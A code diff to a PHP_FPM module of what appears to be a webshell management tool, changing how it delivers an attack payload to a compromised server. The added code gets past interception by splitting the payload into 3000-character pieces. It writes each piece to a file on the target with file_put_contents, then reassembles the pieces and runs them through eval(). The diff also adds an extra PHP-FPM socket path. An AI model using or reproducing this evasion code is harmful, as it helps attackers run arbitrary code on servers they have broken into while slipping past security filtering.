@@ -55,6 +55,7 @@ class PHP_FPM extends Base {
             options: (() => {
               let vals = [
                 'unix:///var/run/php5-fpm.sock',
+                'unix:///tmp/php-cgi-74.sock',
                 'unix:///var/run/php/php5-fpm.sock',
                 'unix:///var/run/php-fpm/php5-fpm.sock',
                 'unix:///var/run/php/php7-fpm.sock',
@@ -217,12 +218,33 @@ class PHP_FPM extends Base {
           sleep(1);
           echo(1);
         `;
+        //payload太长被拦截或连接超时,分成3000长度一个包,写入不同的文件
+        var parts = payload.match(/.{1,3000}/isg) || [];
+        // console.log(payload.length);
+        console.log(parts);
+        var mypart="";
+        for (let i=0;i<parts.length;i++){
+        mypart=`file_put_contents("payload_${i}",'${parts[i].replace(/'/g,"\\\'").replace(/\\\\'/g,"\\\\\\'")}');`;
+        console.log(mypart);
         core.request({
-          _: payload,
+          // _: payload,
+          _:mypart
         }).then((response) => {
-
         }).catch((err) => {
           // 超时也是正常
+        })
+        }
+        var final_payload="$a='';";
+        for (let i=0;i<parts.length;i++){
+          final_payload+=`$a.=file_get_contents('payload_${i}');`;
+        }
+        final_payload+=";eval($a);";
+        console.log(final_payload);
+        core.request({
+          // _: payload,
+          _:final_payload
+        }).then((response) => {
+        }).catch((err) => {
         })
       }).then(() => {
         // 验证是否成功开启
